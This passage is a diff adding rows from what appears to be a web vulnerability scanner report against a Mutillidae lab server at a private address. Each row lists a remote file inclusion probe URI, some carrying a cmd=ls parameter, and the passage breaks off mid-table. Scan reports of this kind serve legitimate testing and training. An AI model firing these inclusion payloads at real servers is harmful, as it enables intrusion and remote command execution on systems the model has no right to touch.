+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?npage=-1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls">http://192.168.1.51:80/mutillidae/?npage=-1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?npage=1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?npage=1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?npage=1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls">http://192.168.1.51:80/mutillidae/?npage=1&amp;content_dir=https://cirt.net/public/rfiinc.txt%00&amp;cmd=ls</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/?show=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/?show=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/?show=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/?show=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?1=lol&amp;PAGES[lol]=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?1=lol&amp;PAGES[lol]=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?1=lol&amp;PAGES[lol]=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?1=lol&amp;PAGES[lol]=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?AML_opensite=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?AML_opensite=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?AML_opensite=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?AML_opensite=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?AMV_openconfig=1&amp;AMV_serverpath=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?AMV_openconfig=1&amp;AMV_serverpath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?AMV_openconfig=1&amp;AMV_serverpath=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?AMV_openconfig=1&amp;AMV_serverpath=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?CONFIG[MWCHAT_Libs]=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?CONFIG[MWCHAT_Libs]=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?CONFIG[MWCHAT_Libs]=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?CONFIG[MWCHAT_Libs]=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?ConfigDir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?ConfigDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?ConfigDir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?ConfigDir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?DIR_PLUGINS=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?DIR_PLUGINS=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?DIR_PLUGINS=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?DIR_PLUGINS=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?G_JGALL[inc_path]=https://cirt.net/public/rfiinc.txt%00</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?G_JGALL[inc_path]=https://cirt.net/public/rfiinc.txt%00: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?G_JGALL[inc_path]=https://cirt.net/public/rfiinc.txt%00">http://192.168.1.51:80/mutillidae/index.php?G_JGALL[inc_path]=https://cirt.net/public/rfiinc.txt%00</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?HomeDir=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?HomeDir=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?HomeDir=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?HomeDir=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?Lang=AR&amp;Page=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?Lang=AR&amp;Page=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?Lang=AR&amp;Page=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?Lang=AR&amp;Page=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?Madoa=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?Madoa=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?Madoa=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?Madoa=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?RP_PATH=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?RP_PATH=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?RP_PATH=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?RP_PATH=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?_REQUEST=&amp;_REQUEST[option]=com_content&amp;_REQUEST[Itemid]=1&amp;GLOBALS=&amp;mosConfig_absolute_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?abg_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?abg_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?abg_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?abg_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?abs_path=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?adduser=true&amp;lang=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?adduser=true&amp;lang=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?adduser=true&amp;lang=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?adduser=true&amp;lang=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?adodb=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?adodb=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?adodb=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?adodb=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?ads_file=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?ads_file=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?ads_file=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?ads_file=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?arquivo=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?arquivo=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?arquivo=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?arquivo=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?back=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?back=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?back=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?back=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?base==https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?base==https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?base==https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?base==https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?basePath=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?basePath=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?basePath=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?basePath=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?bibtexrootrel=https://cirt.net/public/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?bibtexrootrel=https://cirt.net/public/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?bibtexrootrel=https://cirt.net/public/rfiinc.txt?">http://192.168.1.51:80/mutillidae/index.php?bibtexrootrel=https://cirt.net/public/rfiinc.txt?</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?blog_dc_path=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?blog_dc_path=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?blog_dc_path=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?blog_dc_path=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?blog_theme=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?blog_theme=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
+      <a href="http://192.168.1.51:80/mutillidae/index.php?blog_theme=https://cirt.net/public/rfiinc.txt">http://192.168.1.51:80/mutillidae/index.php?blog_theme=https://cirt.net/public/rfiinc.txt</a><br>
+    </td>
+  </tr>
+
+  <tr>
+    <td class="column-head">Reference(s)</td>
+    <td><a href='https://gist.github.com/mubix/5d269c686584875015a2'>https://gist.github.com/mubix/5d269c686584875015a2</a></td>
+  </tr>
+</table>
+
+<table class="dataTable">
+  <tr>
+    <td class="column-head">URI</td>
+    <td>/mutillidae/index.php?body=https://cirt.net/public/rfiinc.txt</td>
+  </tr>
+  <tr>
+    <td class="column-head">HTTP Method</td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head">Description</td>
+    <td>/mutillidae/index.php?body=https://cirt.net/public/rfiinc.txt: Remote File Inclusion (RFI) from RSnake&#x27;s RFI list.</td>
+  </tr>
+  <tr>
+    <td class="column-head">Link</td>
+    <td>
